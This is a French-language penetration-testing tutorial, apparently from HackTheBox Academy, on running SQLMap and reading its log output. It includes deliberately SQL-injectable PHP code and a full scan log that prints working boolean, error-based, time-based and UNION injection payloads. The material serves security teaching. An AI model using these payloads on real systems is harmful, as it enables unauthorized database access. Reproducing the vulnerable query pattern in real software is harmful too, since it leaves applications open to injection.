Premiers pas avec SQLMap
========================

* * * * *

Lorsque vous commencez à utiliser SQLMap, le premier arrêt pour les nouveaux utilisateurs est généralement le message d'aide du programme. Pour aider les nouveaux utilisateurs, il existe deux niveaux de liste de messages d'aide :

-   `Basic Listing`affiche uniquement les options et commutateurs de base, suffisants dans la plupart des cas (switch `-h`):

```
dsgsec@htb[/htb]$ sqlmap -h
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs
...SNIP...

```

-   `Advanced Listing`affiche toutes les options et commutateurs (switch `-hh`):

```
dsgsec@htb[/htb]$ sqlmap -hh
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target URL

    -A AGENT, --user..  HTTP User-Agent header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
...SNIP...

```

Pour plus de détails, il est conseillé aux utilisateurs de consulter le [wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage) du projet , car il représente le manuel officiel d'utilisation de SQLMap.

* * * * *

Scénario de base
----------------

Dans un scénario simple, un testeur d'intrusion accède à la page Web qui accepte les entrées de l'utilisateur via un `GET`paramètre (par exemple, `id`). Ils souhaitent ensuite tester si la page Web est affectée par la vulnérabilité d'injection SQL. Si tel est le cas, ils voudraient l'exploiter, récupérer autant d'informations que possible de la base de données principale, ou même essayer d'accéder au système de fichiers sous-jacent et d'exécuter des commandes du système d'exploitation. Un exemple de code PHP vulnérable SQLi pour ce scénario ressemblerait à ceci :

Code : php

```
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");

```

Étant donné que le rapport d'erreurs est activé pour la requête SQL vulnérable, une erreur de base de données sera renvoyée dans le cadre de la réponse du serveur Web en cas de problème d'exécution de la requête SQL. De tels cas facilitent le processus de détection SQLi, en particulier en cas de falsification manuelle des valeurs de paramètres, car les erreurs qui en résultent sont facilement reconnues :

![](https://academy.hackthebox.com/storage/modules/58/rOrm8tC.png)

Pour exécuter SQLMap sur cet exemple, situé à l'URL de l'exemple `http://www.example.com/vuln.php?id=1`, cela ressemblerait à ce qui suit :

```
dsgsec@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 22:26:45 /2020-09-09/

[22:26:45] [INFO] testing connection to the target URL
[22:26:45] [INFO] testing if the target URL content is stable
[22:26:46] [INFO] target URL content is stable
[22:26:46] [INFO] testing if GET parameter 'id' is dynamic
[22:26:46] [INFO] GET parameter 'id' appears to be dynamic
[22:26:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[22:26:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[22:26:46] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:26:46] [WARNING] reflective value(s) found and filtering out
[22:26:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")
[22:26:46] [INFO] testing 'Generic inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:26:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
...SNIP...
[22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[22:26:46] [INFO] testing 'MySQL inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
...SNIP...
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:26:56] [INFO] target URL appears to have 3 columns in query
[22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8814=8814

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
---
[22:26:56] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
[22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'

[*] ending @ 22:26:57 /2020-09-09/

```

Remarque : dans ce cas, l'option « -u » est utilisée pour fournir l'URL cible, tandis que le commutateur « --batch » est utilisé pour ignorer toute saisie utilisateur requise, en choisissant automatiquement l'option par défaut.

============================================

Description de la sortie SQLMap
===============================

* * * * *

À la fin de la section précédente, la sortie sqlmap nous a montré de nombreuses informations lors de son analyse. Ces données sont généralement cruciales à comprendre, car elles nous guident tout au long du processus d'injection SQL automatisé. Cela nous montre exactement quel type de vulnérabilités SQLMap exploite, ce qui nous aide à signaler le type d'injection de l'application Web. Cela peut également devenir pratique si nous souhaitons exploiter manuellement l'application Web une fois que SQLMap a déterminé le type d'injection et le paramètre vulnérable.

* * * * *

Description des messages du journal
-----------------------------------

Voici quelques-uns des messages les plus courants généralement trouvés lors d'une analyse de SQLMap, ainsi qu'un exemple de chacun de l'exercice précédent et sa description.

#### Le contenu de l'URL est stable

`Log Message:`

-   "le contenu de l'URL cible est stable"

Cela signifie qu'il n'y a pas de changements majeurs entre les réponses en cas de demandes identiques continues. Ceci est important du point de vue de l'automatisation car, en cas de réponses stables, il est plus facile de repérer les différences provoquées par les éventuelles tentatives SQLi. Bien que la stabilité soit importante, SQLMap dispose de mécanismes avancés pour supprimer automatiquement le « bruit » potentiel qui pourrait provenir de cibles potentiellement instables.

#### Le paramètre semble être dynamique

`Log Message:`

-   "Le paramètre GET 'id' semble être dynamique"

Il est toujours souhaité que le paramètre testé soit « dynamique », car c'est le signe que toute modification apportée à sa valeur entraînerait une modification de la réponse ; le paramètre peut donc être lié à une base de données. Dans le cas où la sortie est « statique » et ne change pas, cela pourrait indiquer que la valeur du paramètre testé n'est pas traitée par la cible, du moins dans le contexte actuel.

#### Le paramètre peut être injectable

`Log Message:`"un test heuristique (de base) montre que le paramètre GET 'id' peut être injectable (SGBD possible : 'MySQL')"

Comme indiqué précédemment, les erreurs du SGBD sont une bonne indication du potentiel de SQLi. Dans ce cas, il y a eu une erreur MySQL lorsque SQLMap envoie une valeur intentionnellement invalide (par exemple `?id=1",)..).))'`), ce qui indique que le paramètre testé pourrait être injectable SQLi et que la cible pourrait être MySQL. Il convient de noter qu'il ne s'agit pas d'une preuve de SQLi, mais simplement d'une indication que le mécanisme de détection doit être prouvé lors de l'exécution suivante.

#### Le paramètre peut être vulnérable aux attaques XSS

`Log Message:`

-   "Le test heuristique (XSS) montre que le paramètre GET 'id' pourrait être vulnérable aux attaques de script intersite (XSS)"

Bien que ce ne soit pas son objectif principal, SQLMap exécute également un test heuristique rapide pour détecter la présence d'une vulnérabilité XSS. Dans les tests à grande échelle, où de nombreux paramètres sont testés avec SQLMap, il est agréable de disposer de ce type de vérifications heuristiques rapides, surtout si aucune vulnérabilité SQLi n'est trouvée.

#### Le SGBD back-end est '...'

`Log Message:`

-   "il semble que le SGBD back-end soit 'MySQL'. Voulez-vous ignorer les charges utiles de test spécifiques à d'autres SGBD ? [O/n]"

Lors d'une exécution normale, SQLMap teste tous les SGBD pris en charge. Dans le cas où il existe une indication claire que la cible utilise le SGBD spécifique, nous pouvons limiter les charges utiles à ce SGBD spécifique.

#### Valeurs de niveau/risque

`Log Message:`

-   "pour les tests restants, souhaitez-vous inclure tous les tests pour 'MySQL' étendant les valeurs de niveau (1) et de risque (1) fournies ? [O/n]"

S'il existe une indication claire que la cible utilise le SGBD spécifique, il est également possible d'étendre les tests pour ce même SGBD spécifique au-delà des tests réguliers.\
Cela signifie essentiellement exécuter toutes les charges utiles d'injection SQL pour ce SGBD spécifique, tandis que si aucun SGBD n'était détecté, seules les charges utiles les plus importantes seraient testées.

#### Valeurs réfléchissantes trouvées

`Log Message:`

-   "valeur(s) réfléchissante(s) trouvée(s) et filtrée(s)"

Juste un avertissement indiquant que des parties des charges utiles utilisées se trouvent dans la réponse. Ce comportement pourrait causer des problèmes aux outils d'automatisation, car il représente un courrier indésirable. Cependant, SQLMap dispose de mécanismes de filtrage pour supprimer ces fichiers indésirables avant de comparer le contenu de la page d'origine.

#### Le paramètre semble être injectable

`Log Message:`

-   "Le paramètre GET 'id' semble être 'AND aveugle basé sur un booléen - clause WHERE ou HAVING' injectable (avec --string="luther")"

Ce message indique que le paramètre semble être injectable, même s'il existe toujours un risque qu'il s'agisse d'un résultat faussement positif. Dans le cas de types aveugles booléens et de types SQLi similaires (par exemple, aveugles basés sur le temps), où il existe un risque élevé de faux positifs, à la fin de l'exécution, SQLMap effectue des tests approfondis consistant en de simples vérifications logiques pour la suppression. de résultats faussement positifs.

De plus, `with --string="luther"`indique que SQLMap a reconnu et utilisé l'apparence d'une valeur de chaîne constante `luther`dans la réponse pour la distinguer `TRUE`des `FALSE`réponses. Il s'agit d'une découverte importante car dans de tels cas, il n'est pas nécessaire d'utiliser des mécanismes internes avancés, tels que la suppression de la dynamique/réflexion ou la comparaison floue des réponses, qui ne peuvent pas être considérées comme des faux positifs.

#### Modèle statistique de comparaison basé sur le temps

`Log Message:`

-   "La comparaison temporelle nécessite un modèle statistique plus grand, veuillez patienter.......... (terminé)"

SQLMap utilise un modèle statistique pour la reconnaissance des réponses cibles régulières et (délibérément) retardées. Pour que ce modèle fonctionne, il est nécessaire de collecter un nombre suffisant de temps de réponse réguliers. De cette façon, SQLMap peut statistiquement distinguer le retard délibéré, même dans les environnements réseau à latence élevée.

#### Extension des tests de technique d'injection de requêtes UNION

`Log Message:`

-   "étend automatiquement les plages pour les tests de technique d'injection de requête UNION car il existe au moins une autre technique (potentielle) trouvée"

Les vérifications SQLi par requête UNION nécessitent beaucoup plus de requêtes pour une reconnaissance réussie de la charge utile utilisable que les autres types SQLi. Afin de réduire le temps de test par paramètre, notamment si la cible ne semble pas injectable, le nombre de requêtes est plafonné à une valeur constante (soit 10) pour ce type de contrôle. Cependant, s'il y a de fortes chances que la cible soit vulnérable, en particulier lorsqu'une autre technique SQLi (potentielle) est trouvée, SQLMap étend le nombre par défaut de requêtes pour la requête UNION SQLi, en raison d'une espérance de réussite plus élevée.

#### La technique semble utilisable

`Log Message:`

-   "La technique ORDER BY' semble être utilisable. Cela devrait réduire le temps nécessaire pour trouver le bon nombre de colonnes de requête. Extension automatique de la plage pour le test actuel de la technique d'injection de requête UNION"

En tant que vérification heuristique pour le type SQLi de requête UNION, avant que les `UNION`charges utiles réelles ne soient envoyées, une technique connue sous le nom de `ORDER BY`est vérifiée pour sa convivialité. S'il est utilisable, SQLMap peut rapidement reconnaître le nombre correct de `UNION`colonnes requises en effectuant l'approche de recherche binaire.

Notez que cela dépend de la table affectée dans la requête vulnérable.

#### Le paramètre est vulnérable

`Log Message:`

-   "Le paramètre GET 'id' est vulnérable. Voulez-vous continuer à tester les autres (le cas échéant) ? [o/N]"

C'est l'un des messages les plus importants de SQLMap, car il signifie que le paramètre s'est révélé vulnérable aux injections SQL. Dans les cas habituels, l'utilisateur peut vouloir uniquement trouver au moins un point d'injection (c'est-à-dire un paramètre) utilisable contre la cible. Cependant, si nous effectuons un test approfondi sur l'application Web et souhaitons signaler toutes les vulnérabilités potentielles, nous pouvons continuer à rechercher tous les paramètres vulnérables.

#### Sqlmap a identifié les points d'injection

`Log Message:`

-   "sqlmap a identifié le(s) point(s) d'injection suivant avec un total de 46 requêtes HTTP(s) :"

Ci-dessous se trouve une liste de tous les points d'injection avec leur type, leur titre et leurs charges utiles, qui représente la preuve finale de la détection et de l'exploitation réussies des vulnérabilités SQLi trouvées. Il convient de noter que SQLMap répertorie uniquement les résultats dont il est prouvé qu'ils sont exploitables (c'est-à-dire utilisables).

#### Données enregistrées dans des fichiers texte

`Log Message:`

-   "données récupérées enregistrées dans des fichiers texte sous '/home/user/.sqlmap/output/www.example.com'"

Cela indique l'emplacement du système de fichiers local utilisé pour stocker tous les journaux, sessions et données de sortie pour une cible spécifique - dans ce cas, `www.example.com`. Après une telle exécution initiale, au cours de laquelle le point d'injection est détecté avec succès, tous les détails des exécutions futures sont stockés dans les fichiers de session du même répertoire. Cela signifie que SQLMap essaie de réduire autant que possible les requêtes cibles requises, en fonction des données des fichiers de session.
